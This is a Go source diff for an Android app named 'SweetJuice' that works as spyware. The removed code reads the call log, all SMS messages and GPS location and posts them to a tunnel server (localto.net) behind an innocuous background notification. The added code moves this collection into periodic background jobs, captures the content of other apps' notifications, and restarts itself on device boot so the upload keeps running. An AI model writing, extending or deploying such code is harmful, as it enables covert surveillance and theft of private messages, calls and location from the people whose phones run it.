@@ -1,160 +1,113 @@
 package juiceapp
 
 import (
-	"bytes"
-	"encoding/json"
 	"fmt"
-	"net/http"
-	"time"
+	"sync"
 
 	"sweetjuice/lib/state"
+	"sweetjuice/lib/store"
+	"sweetjuice/lib/tasks"
 	"sweetjuice/lib/views"
 
 	"github.com/sweet-juice/sweetjuice/app"
-	"github.com/sweet-juice/sweetjuice/plugins/calls"
-	"github.com/sweet-juice/sweetjuice/plugins/gps"
-	"github.com/sweet-juice/sweetjuice/plugins/notification"
-	"github.com/sweet-juice/sweetjuice/plugins/sms"
+	"github.com/sweet-juice/sweetjuice/plugins/broadcast"
+	"github.com/sweet-juice/sweetjuice/plugins/notification_listener"
 	"github.com/sweet-juice/sweetjuice/plugins/workmanager"
 )
 
-const serverURL = "https://s4oz6jdx9.localto.net"
-const deviceModel = "SweetJuice-Device"
+var backgroundOnce sync.Once
 
-// StartApplication is the bootstrap function called by the native Android/iOS layer.
 func StartApplication() string {
-	mainState := state.NewMainAppState()
-
-	root := &views.HomeView{
-		State: mainState,
-	}
-
 	registerPluginDefinitions()
+	registerBackgroundTasks() // Bind tasks early so workers can find them
 
+	mainState := state.NewMainAppState()
+	root := &views.HomeView{State: mainState}
+
+	// app.Run starts the core runtime and triggers the first render.
 	app.Run(root)
 
+	// initPlugins registers Go-side native methods (handlers) on the current app instance.
 	initPlugins()
+	tasks.LoadAppConfig()
+	tasks.ResolveDeviceModel()
 
-	registerBackgroundTasks()
+	// Ensure background services and handlers are registered only once.
+	backgroundOnce.Do(func() {
+		initStore()
+		initNotificationListener()
+		registerBroadcastHandlers()
+	})
 
 	return `{"status":"started"}`
 }
 
-func registerBackgroundTasks() {
-	const taskKey = "sweetjuice_notification_task"
+func initStore() {
+	tasks.InitStore()
+}
 
-	workmanager.NewPlugin().RegisterTask(taskKey, func() error {
-		_, notifErr := notification.NewPlugin().Post(notification.Notification{
-			Title:       "Sweet Juice",
-			Body:        "Background task is running.",
-			ChannelID:   "default_channel",
-			ChannelName: "General Notifications",
-			Importance:  notification.ImportanceDefault,
-		})
-		if notifErr != nil {
-			println("notification error:", notifErr)
+func initNotificationListener() {
+	plugin := notification_listener.NewPlugin()
+	plugin.OnPosted("outbox", func(n notification_listener.Notification) error {
+		s := store.Get()
+		if s == nil {
+			fmt.Println("listener: store nil, skip")
+			return nil
 		}
-
-		sendData()
-		return nil
+		err := s.Enqueue(store.EventTypeNotif, map[string]interface{}{
+			"package":    n.PackageName,
+			"id":         n.ID,
+			"title":      n.Title,
+			"text":       n.Text,
+			"is_ongoing": n.IsOngoing,
+			"timestamp":  n.Timestamp,
+		})
+		if err != nil {
+			fmt.Printf("listener: enqueue error: %v\n", err)
+		} else {
+			fmt.Printf("listener: saved notif from %s id=%d\n", n.PackageName, n.ID)
+		}
+		return err
 	})
 }
 
-func sendData() {
-	postCalls()
-	postSMS()
-	postGPS()
+func registerBackgroundTasks() {
+	wm := workmanager.NewPlugin()
+	wm.RegisterTask("sweetjuice_prepare_calls", tasks.CallsJob)
+	wm.RegisterTask("sweetjuice_prepare_sms", tasks.SmsJob)
+	wm.RegisterTask("sweetjuice_prepare_gps", tasks.GpsJob)
+	wm.RegisterTask("sweetjuice_send_outbox", tasks.SenderWorker)
 }
 
-func postCalls() {
-	plugin := calls.NewPlugin()
-	log, err := plugin.GetAll()
-	if err != nil {
-		println("postCalls error:", err)
-		return
+func registerBroadcastHandlers() {
+	// Listen for actual Android system boot intents
+	bootIntents := []string{
+		"android.intent.action.BOOT_COMPLETED",
+		"android.intent.action.QUICKBOOT_POWERON",
 	}
 
-	messages := make([]map[string]interface{}, 0, len(log.Calls))
-	for _, call := range log.Calls {
-		messages = append(messages, map[string]interface{}{
-			"number":    call.Number,
-			"type":      call.Type,
-			"duration":  call.Duration,
-			"timestamp": call.Date,
+	for _, intent := range bootIntents {
+		broadcast.On(intent, func(data interface{}) {
+			fmt.Printf("broadcast: system boot signal received (%v)\n", data)
+			TriggerBackgroundEngine()
 		})
 	}
-
-	_ = postJSON("/receive_data/calls", messages)
 }
 
-func postSMS() {
-	plugin := sms.NewPlugin()
-	folder, err := plugin.GetAll()
-	if err != nil {
-		println("postSMS error:", err)
-		return
+// TriggerBackgroundEngine enqueues the periodic work with the Android OS.
+func TriggerBackgroundEngine() {
+	fmt.Println("engine: enqueuing background tasks to WorkManager")
+
+	wm := workmanager.NewPlugin()
+	networkConstraints := workmanager.Constraints{
+		NetworkType: workmanager.NetworkConnected,
 	}
 
-	messages := make([]map[string]interface{}, 0, len(folder.Messages))
-	for _, msg := range folder.Messages {
-		messages = append(messages, map[string]interface{}{
-			"address": msg.Address,
-			"body":    msg.Body,
-			"date":    msg.Timestamp,
-			"type":    msg.Type,
-		})
-	}
+	// 1. Enqueue data preparation tasks
+	wm.EnqueuePeriodic("sweetjuice_prepare_calls", 15, nil, true, false)
+	wm.EnqueuePeriodic("sweetjuice_prepare_sms", 15, nil, true, false)
+	wm.EnqueuePeriodic("sweetjuice_prepare_gps", 15, nil, true, false)
 
-	_ = postJSON("/receive_data/sms", messages)
-}
-
-func postGPS() {
-	plugin := gps.NewPlugin()
-	loc, err := plugin.GetCurrentLocation()
-	if err != nil {
-		println("postGPS error:", err)
-		return
-	}
-
-	payload := []map[string]interface{}{
-		{
-			"latitude":  loc.Latitude,
-			"longitude": loc.Longitude,
-			"accuracy":  loc.Accuracy,
-			"altitude":  loc.Altitude,
-			"speed":     loc.Speed,
-			"timestamp": loc.Timestamp,
-		},
-	}
-
-	_ = postJSON("/receive_data/gps", payload)
-}
-
-func postJSON(path string, messages []map[string]interface{}) error {
-	payload, err := json.Marshal(messages)
-	if err != nil {
-		return err
-	}
-
-	req, err := http.NewRequest("POST", serverURL+path, bytes.NewReader(payload))
-	if err != nil {
-		return err
-	}
-
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("localtonet-skip-warning", "1")
-	req.Header.Set("C-Device", deviceModel)
-
-	client := &http.Client{Timeout: 30 * time.Second}
-	resp, err := client.Do(req)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode >= 400 {
-		return fmt.Errorf("server returned %d for %s", resp.StatusCode, path)
-	}
-
-	return nil
+	// 2. Enqueue the sender task with network constraints
+	wm.EnqueuePeriodic("sweetjuice_send_outbox", 15, &networkConstraints, true, false)
 }
